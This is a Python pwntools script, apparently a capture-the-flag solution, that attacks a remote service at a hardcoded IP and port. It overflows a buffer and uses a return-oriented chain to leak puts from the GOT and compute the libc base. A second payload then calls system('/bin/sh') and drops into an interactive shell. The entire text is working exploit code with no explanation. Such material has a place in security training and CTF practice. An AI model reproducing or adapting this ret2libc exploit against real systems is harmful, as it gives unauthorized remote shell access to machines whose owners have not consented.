from pwn import *

#p = process("./problem")
p = remote("34.101.174.85", 10010)

puts_got = 0x601020
puts_plt = 0x0000000000400630
pop_rdi = 0x0000000000400923
main_ret = 0x4008b3
main_func = 0x400859

payload = b"a"*9
payload += p64(main_ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_ret)
payload += p64(main_func)

print(p.recvuntil(b"\n"))
p.sendline(payload)
puts_leak = u64(p.recv(6) + b'\x00\x00')
print(hex(puts_leak))

libc_address = puts_leak-0x80970
binsh = libc_address + 0x1b3d88
system = libc_address + 0x4f420

payload2 = b"a"*9
payload2+=p64(main_ret)
payload2+=p64(pop_rdi)
payload2+=p64(binsh)
payload2+=p64(system)
payload2+=p64(0x0)

print(p.recvuntil(b"\n"))
p.sendline(payload2)
p.interactive()

